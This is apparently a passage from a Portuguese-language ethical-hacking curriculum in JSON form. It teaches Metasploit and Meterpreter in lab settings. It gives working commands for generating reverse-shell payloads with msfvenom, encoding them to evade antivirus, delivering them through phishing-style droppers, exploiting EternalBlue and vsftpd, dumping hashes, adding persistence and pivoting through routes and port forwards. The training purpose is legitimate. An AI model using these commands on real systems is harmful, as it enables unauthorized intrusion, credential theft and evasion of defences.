                              "practicalExample": "Em um lab com Kali Linux (atacante) e Metasploitable 2 (vítima), lance msfconsole, atualize, configure handler em LPORT 4444, explore vsftpd para sessão Meterpreter, adicione autoroute e pivote para outra VM na rede interna executando 'portfwd' para acessar serviços remotos.",
                              "finalVerifications": [
                                "msfconsole inicia em <20s sem erros.",
                                "Módulos atualizados e search meterpreter retorna >50 resultados.",
                                "Handler aceita conexão reverse_tcp em 4444.",
                                "Autoroute cria rota pivot válida após sessão Meterpreter.",
                                "Comandos como 'getuid', 'ps' e 'route' funcionam na sessão.",
                                "Job persiste após múltiplas sessões."
                              ],
                              "assessmentCriteria": [
                                "Completude: Todos steps executados sem falhas críticas.",
                                "Eficiência: Tempo total <50 minutos.",
                                "Precisão: Configurações LHOST/LPORT corretas e payload compatível.",
                                "Segurança: Uso de lab isolado e limpeza de jobs/sessões.",
                                "Conhecimento: Explicação verbal de cada comando usado.",
                                "Adaptabilidade: Ajuste para Windows/Linux payloads."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento de TCP reverse shells e port forwarding.",
                                "Sistemas Operacionais: Comandos Linux e gerenciamento de processos.",
                                "Programação: Scripts Ruby em módulos Metasploit personalizados.",
                                "Banco de Dados: Integração PostgreSQL para workspaces e loot.",
                                "Ética: Conformidade com leis de ethical hacking e regras de engajamento."
                              ],
                              "realWorldApplication": "Em pentests profissionais, configure Metasploit para capturar shells iniciais em endpoints expostos, pivote via Meterpreter para DMZ interna, extraia credenciais e escale privilégios, simulando ataques APT em exercícios de Red Team."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.1.2",
                            "name": "Gerar e Entregar Payload Meterpreter",
                            "description": "Criação de payloads reversos TCP/HTTP com msfvenom, incluindo opções de codificação para evasão e configuração de LHOST/LPORT para sessões persistentes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente e Parâmetros Básicos do msfvenom",
                                  "subSteps": [
                                    "Instale e inicie o Metasploit Framework no Kali Linux com 'msfconsole'.",
                                    "Verifique a conectividade de rede definindo LHOST (seu IP) com 'ifconfig' ou 'ip addr'.",
                                    "Escolha LPORT (porta de escuta, ex: 4444) e confirme disponibilidade com 'netstat -tuln'.",
                                    "Revise payloads disponíveis: 'msfvenom -l payloads | grep meterpreter'.",
                                    "Entenda opções básicas: -p para payload, -f para formato (exe, elf), -o para output."
                                  ],
                                  "verification": "Execute 'msfvenom --help' e liste payloads meterpreter sem erros; confirme LHOST/LPORT anotados.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Kali Linux com Metasploit",
                                    "Máquina vítima virtual (ex: Metasploitable)",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use IP estático para LHOST em labs; teste portas comuns como 80/443 para HTTP.",
                                  "learningObjective": "Compreender configuração inicial de msfvenom e parâmetros essenciais para payloads reversos.",
                                  "commonMistakes": [
                                    "Usar IP errado de LHOST (use host atacante, não vítima)",
                                    "Porta já em uso sem verificação",
                                    "Ignorar arquitetura (x86 vs x64)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar Payload Reverso TCP Básico Meterpreter",
                                  "subSteps": [
                                    "Gere payload: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu_IP> LPORT=4444 -f exe -o payload_tcp.exe'.",
                                    "Inicie listener no msfconsole: 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <seu_IP>; set LPORT 4444; exploit'.",
                                    "Transfira payload para vítima (ex: via SMB ou wget).",
                                    "Execute payload na vítima e observe sessão Meterpreter no listener.",
                                    "Teste comandos básicos: 'sysinfo', 'getuid' na sessão."
                                  ],
                                  "verification": "Sessão Meterpreter estabelecida com comandos básicos funcionando sem falhas.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": [
                                    "msfvenom",
                                    "msfconsole",
                                    "Máquina vítima Windows virtual"
                                  ],
                                  "tips": "Sempre rode handler em background com '&' para múltiplas sessões.",
                                  "learningObjective": "Criar e ativar payload TCP reverso para conexão Meterpreter inicial.",
                                  "commonMistakes": [
                                    "Payload sem reverse (use reverse_tcp)",
                                    "Mismatch LHOST/LPORT entre msfvenom e handler",
                                    "Antivírus detecta exe sem codificação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar Codificações para Evasão de Detecção",
                                  "subSteps": [
                                    "Liste encoders: 'msfvenom -l encoders'.",
                                    "Gere com encoder: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload_encoded.exe'.",
                                    "Aumente iterações (-i) para mais evasão (teste 3-7).",
                                    "Compare tamanhos e hashes: 'md5sum payload*.exe'.",
                                    "Teste novo payload com handler e verifique persistência."
                                  ],
                                  "verification": "Payload codificado executa sem detecção por AV básico (ex: VirusTotal score baixo); sessão abre.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "msfvenom com encoders",
                                    "VirusTotal ou AV local para teste"
                                  ],
                                  "tips": "Combine encoders (-e) com --platform; use -b para evitar bad chars.",
                                  "learningObjective": "Implementar técnicas de ofuscação para bypass de defesas em payloads.",
                                  "commonMistakes": [
                                    "Excesso de iterações torna payload instável",
                                    "Encoder incompatível com payload/arch",
                                    "Não testar pós-codificação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerar e Entregar Payload HTTP Reverso com Persistência",
                                  "subSteps": [
                                    "Gere HTTP: 'msfvenom -p windows/meterpreter/reverse_http LHOST=<IP> LPORT=80 -f exe -o payload_http.exe'.",
                                    "Adicione persistência básica: Integre com autorun ou use 'run persistence' pós-shell.",
                                    "Configure handler: 'use exploit/multi/handler; set payload windows/meterpreter/reverse_http; exploit'.",
                                    "Entregue via phishing simulado ou dropper (ex: embed em PDF/HTA).",
                                    "Verifique sessão: 'sessions -l' e migre se necessário."
                                  ],
                                  "verification": "Sessão HTTP reversa persistente após reboot simulado; comandos avançados funcionam.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "msfvenom HTTP payloads",
                                    "Ferramentas de entrega (ex: Apache para host)"
                                  ],
                                  "tips": "HTTP sobre 80/443 evade firewalls; use reverse_https para SSL.",
                                  "learningObjective": "Criar payloads HTTP evasivos e configurá-los para entrega em cenários reais.",
                                  "commonMistakes": [
                                    "LPORT bloqueado por firewall (use 80/443)",
                                    "Sem handler HTTP compatível",
                                    "Persistência falha sem privilégios"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Metasploitable como vítima: Gere 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -e x86/shikata_ga_nai -i 3 > payload.elf', transfira via wget, execute e ganhe shell Meterpreter para explorar pivots.",
                              "finalVerifications": [
                                "Gere payload TCP e HTTP sem erros de sintaxe.",
                                "Estabeleça sessões reversas com handlers correspondentes.",
                                "Aplique encoder e confirme redução em detecções AV.",
                                "Execute comandos Meterpreter (getsystem, hashdump) em sessão.",
                                "Documente LHOST/LPORT e opções usadas em relatório.",
                                "Teste persistência pós-reboot da vítima."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos comandos msfvenom (parâmetros corretos).",
                                "Sucesso em evasão (payload não detectado por scans básicos).",
                                "Estabilidade da sessão Meterpreter (sem crashes).",
                                "Documentação completa de passos e saídas.",
                                "Compreensão de reverse vs bind shells.",
                                "Aplicação ética em ambiente controlado."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de TCP/HTTP e portas (CC-Networking).",
                                "Programação: Scripts para automação de msfvenom (Python/Ruby).",
                                "Segurança: Integração com pivoting e pós-exploração (SC-Pivoting).",
                                "Sistemas Operacionais: Arquiteturas x86/x64 e privilégios.",
                                "Ética: Discussão de uso legal em pentesting (Ethics module)."
                              ],
                              "realWorldApplication": "Em operações de Red Team, pentesters geram payloads Meterpreter codificados para infectar endpoints corporativos durante simulações de ataque, estabelecendo C2 persistente para pivoting interno, extração de dados e demonstração de vulnerabilidades a clientes."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.1.3",
                            "name": "Estabelecer e Interagir com Sessão Meterpreter",
                            "description": "Uso de exploit/multi/handler para capturar sessões, comandos básicos como sysinfo, getuid e shell para verificação de acesso inicial.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Multi/Handler Listener no Metasploit",
                                  "subSteps": [
                                    "Abra o terminal no Kali Linux e inicie o Metasploit com 'msfconsole'.",
                                    "Use o comando 'use exploit/multi/handler' para selecionar o módulo handler.",
                                    "Defina o payload com 'set payload windows/meterpreter/reverse_tcp' (ajuste para o SO alvo).",
                                    "Configure LHOST e LPORT com 'set LHOST <seu_IP>' e 'set LPORT 4444'.",
                                    "Execute com 'exploit' ou 'run' para iniciar o listener."
                                  ],
                                  "verification": "Verifique se o handler está escutando no console com mensagem 'Listening for connection...' sem erros.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Kali Linux com Metasploit instalado",
                                    "Terminal",
                                    "VM alvo configurada (ex: Metasploitable)"
                                  ],
                                  "tips": "Use 'show options' para verificar configurações antes de executar; escolha LPORT não bloqueado pelo firewall.",
                                  "learningObjective": "Entender e configurar um listener passivo para capturar payloads Meterpreter.",
                                  "commonMistakes": [
                                    "Esquecer de definir LHOST/LPORT",
                                    "Payload incompatível com o SO alvo",
                                    "Firewall bloqueando a porta"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar e Entregar o Payload via Exploit",
                                  "subSteps": [
                                    "No msfconsole, selecione um exploit compatível com 'use exploit/windows/smb/ms17_010_eternalblue' (exemplo para Windows).",
                                    "Defina o payload Meterpreter com 'set payload windows/x64/meterpreter/reverse_tcp'.",
                                    "Configure RHOSTS com o IP do alvo: 'set RHOSTS <IP_alvo>'.",
                                    "Ajuste LHOST para coincidir com o handler: 'set LHOST <seu_IP>'.",
                                    "Execute o exploit com 'exploit' para entregar o payload e aguardar callback."
                                  ],
                                  "verification": "Confirme se uma sessão Meterpreter é capturada no handler com ' [*] Meterpreter session 1 opened'.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Metasploit console",
                                    "Exploit module compatível",
                                    "Alvo vulnerável (lab VM)"
                                  ],
                                  "tips": "Teste vulnerabilidades primeiro com Nmap; use payloads staged para conexões instáveis.",
                                  "learningObjective": "Dominar a geração e entrega de payloads Meterpreter via exploits automatizados.",
                                  "commonMistakes": [
                                    "RHOSTS incorreto",
                                    "Exploit não compatível com versão do alvo",
                                    "Falha em alinhar LHOST entre handler e exploit"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interagir com a Sessão Meterpreter Capturada",
                                  "subSteps": [
                                    "Liste sessões ativas com 'sessions -l' no msfconsole.",
                                    "Entre na sessão com 'sessions -i 1' (substitua 1 pelo ID da sessão).",
                                    "Confirme conexão com 'sysinfo' para exibir informações do sistema remoto.",
                                    "Verifique privilégios com 'getuid' para identificar o usuário atual.",
                                    "Teste shell interativo com 'shell' para acessar comandos nativos do SO."
                                  ],
                                  "verification": "Sessão ativa responde a comandos sem timeout; outputs de sysinfo e getuid são exibidos corretamente.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Sessão Meterpreter ativa",
                                    "Msfconsole com sessions command"
                                  ],
                                  "tips": "Use 'background' para voltar ao msfconsole sem perder a sessão; '? help' para lista de comandos.",
                                  "learningObjective": "Navegar e interagir efetivamente com sessões Meterpreter estabelecidas.",
                                  "commonMistakes": [
                                    "Não listar sessões antes de interagir",
                                    "Comandos digitados incorretamente",
                                    "Sessão morta por timeout"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Acesso Inicial e Gerenciar a Sessão",
                                  "subSteps": [
                                    "Execute 'ps' para listar processos e identificar contexto de execução.",
                                    "Use 'getpid' para PID atual e 'hashdump' se privilégios permitirem.",
                                    "Saia do shell com 'exit' e teste upload/download com 'upload /local/file.txt'.",
                                    "Background a sessão com 'background' e liste com 'sessions -l'.",
                                    "Documente outputs em um arquivo de log para relatório."
                                  ],
                                  "verification": "Acesso shell funcional, arquivos transferidos com sucesso, sessão backgrounded persistentemente.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Sessão Meterpreter",
                                    "Arquivos de teste locais",
                                    "Editor de texto para logs"
                                  ],
                                  "tips": "Sempre background sessões para multitarefa; evite comandos destrutivos em labs.",
                                  "learningObjective": "Validar e expandir acesso inicial via comandos Meterpreter básicos.",
                                  "commonMistakes": [
                                    "Executar comandos sem privilégios",
                                    "Não backgroundar sessões",
                                    "Ignorar anti-vírus detectando payload"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Kali (192.168.1.100) e Metasploitable (192.168.1.101): Configure handler reverse_tcp LPORT 4444; use exploit/unix/ftp/vsftpd_234_backdoor no alvo; capture sessão 1; rode sysinfo (Linux Ubuntu), getuid (root), shell (acesso bash interativo).",
                              "finalVerifications": [
                                "Handler captura sessão Meterpreter sem erros.",
                                "Comandos sysinfo e getuid retornam dados precisos do alvo.",
                                "Shell interativo permite execução de comandos nativos.",
                                "Sessão pode ser backgrounded e relistada.",
                                "Transferência de arquivo (upload/download) funciona.",
                                "Nenhum crash ou perda de sessão durante interações."
                              ],
                              "assessmentCriteria": [
                                "Configurações de handler e exploit alinhadas corretamente (100% opções setadas).",
                                "Sessão estabelecida em menos de 5 minutos de exploit.",
                                "Execução precisa de 5+ comandos Meterpreter sem sintaxe erros.",
                                "Verificação de privilégios e sistema via getuid/sysinfo documentada.",
                                "Sessão gerenciada (background/list) demonstrada.",
                                "Relatório de outputs capturado e analisado."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de conexões TCP reverse shells e portas dinâmicas.",
                                "Sistemas Operacionais: Interpretação de outputs sysinfo e comandos shell multiplataforma.",
                                "Programação: Familiaridade com módulos Ruby no Metasploit Framework.",
                                "Ética e Direito: Aplicação responsável em ethical hacking e conformidade legal.",
                                "Análise de Dados: Logging e interpretação de outputs para relatórios de pentest."
                              ],
                              "realWorldApplication": "Em penetration testing profissionais (ex: Red Team operations), estabelece foothold inicial em redes corporativas para mapear defesas, simular ataques persistentes e recomendar patches, sempre com autorização ROE (Rules of Engagement)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.3.2",
                        "name": "Configuração de Rotas para Pivoting",
                        "description": "Configuração de rotas internas no Meterpreter para permitir o tráfego através da máquina comprometida, utilizando módulos como autoroute.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.3.2.1",
                            "name": "Instalar e Configurar o Módulo Autoroute",
                            "description": "Carregamento do post/multi/manage/autoroute, adição de subsessões com route add e verificação de rotas ativas com route print.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar a Sessão Meterpreter para Configuração de Rotas",
                                  "subSteps": [
                                    "Selecione a sessão Meterpreter ativa no console do Metasploit usando 'sessions -i <ID>'.",
                                    "Verifique subsessões disponíveis com 'sessions -l' para identificar alvos de pivoting.",
                                    "Background a sessão principal se necessário com 'background' para gerenciar múltiplas sessões.",
                                    "Confirme conectividade básica executando 'getuid' e 'ipconfig' na sessão.",
                                    "Anote os IPs de rede da vítima para uso posterior em rotas."
                                  ],
                                  "verification": "Sessão interativa confirmada e subsessões listadas sem erros.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Console Metasploit ativo, sessão Meterpreter com acesso de shell estabelecida.",
                                  "tips": "Sempre liste sessões antes de interagir para evitar confusões em ambientes multi-sessão.",
                                  "learningObjective": "Entender gerenciamento de sessões Meterpreter como pré-requisito para módulos de pivoting.",
                                  "commonMistakes": "Esquecer de selecionar a sessão correta, levando a comandos executados em sessões erradas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Carregar e Executar o Módulo Autoroute",
                                  "subSteps": [
                                    "Digite 'use post/multi/manage/autoroute' no console Meterpreter.",
                                    "Defina o parâmetro SESSION com 'set SESSION <ID da subsessão>'.",
                                    "Verifique opções com 'show options' para confirmar configurações.",
                                    "Execute o módulo com 'run' ou 'exploit'.",
                                    "Aguarde confirmação de instalação de rotas automáticas."
                                  ],
                                  "verification": "Módulo executado sem erros e mensagem de sucesso exibida no console.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Módulo post/multi/manage/autoroute disponível no Metasploit, subsessão ID conhecida.",
                                  "tips": "Use 'run' em vez de 'exploit' para módulos post, pois é mais apropriado para configurações.",
                                  "learningObjective": "Dominar o carregamento e execução de módulos post para automação de rotas em pivoting.",
                                  "commonMistakes": "Definir SESSION incorreto, resultando em falha silenciosa do módulo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Adicionar Rotas Manualmente com Route Add",
                                  "subSteps": [
                                    "No console Meterpreter, digite 'route add <subnet> <netmask> <session ID>', ex: 'route add 192.168.1.0 255.255.255.0 2'.",
                                    "Repita para múltiplas subsessões se necessário, cobrindo sub-redes relevantes.",
                                    "Confirme adição sem erros de sintaxe ou sessão inválida.",
                                    "Ajuste netmasks conforme topologia de rede observada via 'ipconfig'.",
                                    "Documente rotas adicionadas para referência futura."
                                  ],
                                  "verification": "Comando 'route add' retorna 'Route added' para cada sub-rede.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "IPs e netmasks da rede vítima, IDs de sessões ativas.",
                                  "tips": "Use netmask /24 (255.255.255.0) para sub-redes comuns em testes iniciais.",
                                  "learningObjective": "Aprender configuração manual de rotas para cenários onde Autoroute é insuficiente.",
                                  "commonMistakes": "Erro de sintaxe no comando route add, como omitir netmask."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar e Testar Rotas Ativas",
                                  "subSteps": [
                                    "Execute 'route print' para listar todas as rotas configuradas.",
                                    "Teste pivoting com 'ping <IP alvo na sub-rede>' ou 'portfwd add'.",
                                    "Verifique persistência reiniciando sessão e rodando 'route print' novamente.",
                                    "Remova rotas desnecessárias com 'route delete <subnet> <netmask> <session>' se aplicável.",
                                    "Registre saída de 'route print' para relatório."
                                  ],
                                  "verification": "'route print' exibe rotas ativas apontando para sessões corretas; ping responde.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "IP alvo na sub-rede pivotada, ferramentas de rede como ping.",
                                  "tips": "Teste imediatamente após configuração para detectar problemas de firewall ou conectividade.",
                                  "learningObjective": "Validar eficácia das rotas em cenários reais de pivoting.",
                                  "commonMistakes": "Ignorar verificação, assumindo sucesso sem 'route print'."
                                }
                              ],
                              "practicalExample": "Em um pentest de rede corporativa, após comprometer uma workstation (sessão 1, 192.168.1.10), use Autoroute na subsessão 2 (servidor interno 10.0.0.5) para adicionar rota 10.0.0.0/24, permitindo acesso a DMZ interna via pivoting sem detecção direta.",
                              "finalVerifications": [
                                "'route print' lista todas as rotas adicionadas corretamente.",
                                "Ping ou nmap para IP em sub-rede pivotada responde via pivoting.",
                                "Módulo Autoroute executado sem warnings ou erros.",
                                "Rotas persistem após reconexão à sessão Meterpreter.",
                                "Nenhuma rota conflita com tráfego existente.",
                                "Documentação de comandos e saídas salva."
                              ],
                              "assessmentCriteria": [
                                "Execução precisa de 'use post/multi/manage/autoroute' e 'run'.",
                                "Rotas adicionadas manualmente com sintaxe correta e netmasks apropriados.",
                                "Verificação via 'route print' demonstra compreensão de saída.",
                                "Teste de pivoting bem-sucedido sem falhas de conectividade.",
                                "Identificação e correção de erros comuns durante o processo.",
                                "Tempo total dentro do estimado com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Compreensão de roteamento, subnets e netmasks.",
                                "Ethical Hacking: Integração com exploits e payloads em pentests.",
                                "Sistemas Operacionais: Gerenciamento de sessões em Windows/Linux via Meterpreter.",
                                "Programação em Ruby: Customização de módulos Metasploit se necessário."
                              ],
                              "realWorldApplication": "Durante Red Team Operations ou Certified Ethical Hacker (CEH) engagements, configure Autoroute para pivotar de hosts comprometidos para segmentos internos de rede, permitindo exploração lateral sem exposição direta do C2 server."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.3.2.2",
                            "name": "Gerenciar Subsessões e Rotas Dinâmicas",
                            "description": "Criação de múltiplas rotas para sub-redes internas, exclusão de rotas desnecessárias com route delete e troubleshooting de falhas de conectividade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Iniciar e Gerenciar Subsessões no Meterpreter",
                                  "subSteps": [
                                    "Inicie o Meterpreter em uma sessão principal via msfconsole com 'use exploit/multi/handler' e configure payload.",
                                    "Use 'sessions -i <ID>' para interagir com a sessão principal.",
                                    "Crie uma subsessão executando 'sessions -u <ID>' para upload de payload em host pivô.",
                                    "Liste subsessões com 'sessions -l' e mude entre elas com 'sessions -i <subID>'.",
                                    "Configure autoroute para subsessões com 'run autoroute -s <subnet>'."
                                  ],
                                  "verification": "Execute 'sessions -l' e confirme múltiplas subsessões ativas; teste conectividade básica entre elas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Kali Linux com Metasploit Framework",
                                    "Máquina vítima configurada (ex: Metasploitable)",
                                    "Rede lab isolada (VirtualBox/VMware)"
                                  ],
                                  "tips": "Sempre nomeie sessões com 'sessions -n <name> <ID>' para facilitar gerenciamento em cenários complexos.",
                                  "learningObjective": "Dominar criação e navegação entre subsessões para expandir acesso em pivoting.",
                                  "commonMistakes": [
                                    "Não configurar LHOST corretamente levando a falhas de callback",
                                    "Ignorar permissões elevadas necessárias para subsessões",
                                    "Confundir IDs de sessões principais e subsessões"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Rotas Dinâmicas para Sub-redes Internas",
                                  "subSteps": [
                                    "Na subsessão pivô, execute 'run autoroute -s <subnet/mask>' para adicionar rota automática (ex: 192.168.2.0/24).",
                                    "Verifique rotas com 'route' no Meterpreter para listar entradas adicionadas.",
                                    "Teste conectividade com 'ping <internal_IP>' de uma nova sessão ou ferramenta externa.",
                                    "Adicione múltiplas rotas para sub-redes com comandos repetidos para cada subnet.",
                                    "Integre com post modules se necessário: 'use post/multi/manage/autoroute'."
                                  ],
                                  "verification": "Execute 'route' e confirme rotas para sub-redes internas; ping bem-sucedido para hosts internos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Meterpreter shell ativo",
                                    "Ferramentas como nmap para escaneamento pós-rota",
                                    "Diagrama de rede lab"
                                  ],
                                  "tips": "Use CIDR notation precisa (/24, /16) para evitar sobreposições de rotas.",
                                  "learningObjective": "Habilitar acesso transparente a redes internas via pivoting dinâmico.",
                                  "commonMistakes": [
                                    "Especificar subnet incorreta causando rotas inválidas",
                                    "Não testar conectividade imediatamente após adição",
                                    "Conflitos de rota com firewall do pivô"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Excluir Rotas Desnecessárias com Route Delete",
                                  "subSteps": [
                                    "Liste rotas existentes com 'route' para identificar entradas desnecessárias.",
                                    "Execute 'route delete <subnet/mask>' para remover rota específica (ex: route delete 192.168.2.0/24).",
                                    "Confirme remoção com 'route' novamente e teste perda de conectividade para validar.",
                                    "Limpe todas rotas autoroute com 'run autoroute -p' se necessário para reset.",
                                    "Registre mudanças em log para auditoria: 'setg LogLevel 3'."
                                  ],
                                  "verification": "'route' mostra remoção da rota alvo; ping falha para host removido mas succeeds para outros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Sessão Meterpreter com rotas pré-configuradas",
                                    "Script de log para rastreamento"
                                  ],
                                  "tips": "Sempre backup rotas com 'route print > routes.txt' antes de deletes em massa.",
                                  "learningObjective": "Manter tabela de rotas limpa para otimizar performance e stealth.",
                                  "commonMistakes": [
                                    "Deletar rota principal causando perda total de acesso",
                                    "Syntax error em subnet (use aspas se spaces)",
                                    "Não verificar pós-delete levando a rotas órfãs"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Troubleshooting de Falhas de Conectividade em Rotas e Subsessões",
                                  "subSteps": [
                                    "Verifique status de sessões com 'sessions -l -v' para timeouts ou dead sessions.",
                                    "Inspecione rotas com 'route' e teste com 'ping -c 3 <IP>' ou 'port_scan'.",
                                    "Cheque firewall pivô: 'shell' > netsh advfirewall para Windows ou iptables para Linux.",
                                    "Reestabeleça rota com 'autoroute -s <subnet>' e monitore com 'run persistence'.",
                                    "Use 'getsystem' ou 'hashdump' para diagnosticar issues de privilégio."
                                  ],
                                  "verification": "Conectividade restaurada: ping succeeds, nmap scan detecta hosts internos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramentas de diagnóstico: tcpdump, Wireshark",
                                    "Logs Metasploit (/var/log/msf*.log)"
                                  ],
                                  "tips": "Ative verbose logging 'setg VERBOSE true' para traces detalhados de erros.",
                                  "learningObjective": "Diagnosticar e resolver issues comuns em pivoting para operações contínuas.",
                                  "commonMistakes": [
                                    "Assumir crash de sessão sem checar network stack",
                                    "Ignorar MTU issues em rotas VPN-like",
                                    "Não escalar privilégios antes de route mods"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de CTF com rede corporativa simulada (DMZ pivô em 192.168.1.10 acessando internal 192.168.2.0/24), crie subsessão no pivô, adicione rota para internal servers, delete rota temporária para DB server após exploit, troubleshoot ping falhas devido a Windows Firewall, restaurando acesso full para exfiltração de dados.",
                              "finalVerifications": [
                                "Lista de sessões mostra subsessões ativas e estáveis por 10+ minutos.",
                                "Tabela de rotas inclui apenas sub-redes relevantes sem duplicatas.",
                                "Ping e nmap succeeds para todos hosts roteados; deletes isolam acessos desnecessários.",
                                "Troubleshoot resolveu 3 cenários simulados de falha (timeout, firewall, privilege).",
                                "Logs registram todas ações sem erros críticos.",
                                "Performance: latência <500ms em comandos routed."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe de comandos (autoroute, route delete, sessions) sem erros.",
                                "Eficiência: gerenciamento de 4+ subsessões e 3 rotas em <90 minutos.",
                                "Stealth: sem detecção por EDR simulado (no alerts em logs).",
                                "Troubleshooting: identifica e fixa root cause em <5 minutos por issue.",
                                "Documentação: relatório com screenshots de 'route' before/after e verificações.",
                                "Escalabilidade: aplica a múltiplas sub-redes sem perda de sessões."
                              ],
                              "crossCurricularConnections": [
                                "Redes (CCNA): Conceitos de routing tables, CIDR, OSPF-like dynamics.",
                                "Programação (Python): Scripting Meterpreter APIs para automação de rotas.",
                                "Sistemas Operacionais: Gerenciamento de firewall (iptables/netsh) e privilégios.",
                                "Análise de Malware: Persistência via rotas em C2 frameworks como Cobalt Strike.",
                                "Ética e Lei: Logging e chain-of-custody em ops autorizadas."
                              ],
                              "realWorldApplication": "Em red team engagements, gerencia pivoting em entornos enterprise para acessar segmentos isolados (ex: AD domain controllers atrás de firewalls), limpando rotas para evitar detecção pós-engajamento, e troubleshooting em tempo real durante jogos de guerra cibernética para manter persistência contra blue team hunters."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.3.3",
                        "name": "Execução Avançada de Pivoting com Meterpreter",
                        "description": "Técnicas práticas de pivoting usando port forwarding e socks proxy para acessar hosts internos, simulando cenários de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.3.3.1",
                            "name": "Implementar Port Forwarding Local e Remoto",
                            "description": "Comandos portfwd add para redirecionar portas TCP/UDP através da sessão pivot, testes com nmap e netcat para validar acessibilidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste e Sessão Pivot Meterpreter",
                                  "subSteps": [
                                    "Inicie o Metasploit Console (msfconsole) em uma máquina Kali Linux.",
                                    "Configure e execute um exploit para obter acesso inicial a uma máquina vítima (target1) e obtenha uma sessão Meterpreter.",
                                    "Upgrade a sessão para Meterpreter se necessário usando 'sessions -u <id>'.",
                                    "Verifique conectividade de rede da sessão pivot com 'ipconfig' ou 'ifconfig' no Meterpreter.",
                                    "Prepare uma segunda máquina alvo (target2) com serviços internos (ex: web server na porta 80) inacessível diretamente."
                                  ],
                                  "verification": "Confirme que a sessão Meterpreter está ativa e estável com 'sessions -l' e teste comandos básicos como 'sysinfo'.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Kali Linux VM",
                                    "Metasploitable2 (target1)",
                                    "Outra VM com serviço interno (target2)",
                                    "Metasploit Framework"
                                  ],
                                  "tips": "Use exploits como eternalblue ou beef para sessões estáveis; documente IDs de sessão.",
                                  "learningObjective": "Entender e configurar uma sessão Meterpreter pivot para simular rede comprometida.",
                                  "commonMistakes": [
                                    "Falhar em upgradar shell para Meterpreter",
                                    "Ignorar verificação de conectividade de rede",
                                    "Não isolar VMs em rede interna"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Port Forwarding Local (LPORT)",
                                  "subSteps": [
                                    "Na sessão Meterpreter pivot, execute 'background' para backgroundar a sessão.",
                                    "Use 'portfwd add -l 8080 -p 80 -r 192.168.2.100' (exemplo: local 8080 -> remote 80 em target2 via pivot).",
                                    "Verifique adição com 'portfwd list'.",
                                    "Teste conectividade básica do host atacante para a porta local forwardada com 'nc -zv localhost 8080'.",
                                    "Acesse o serviço forwardado via browser ou curl no host atacante (ex: curl http://localhost:8080)."
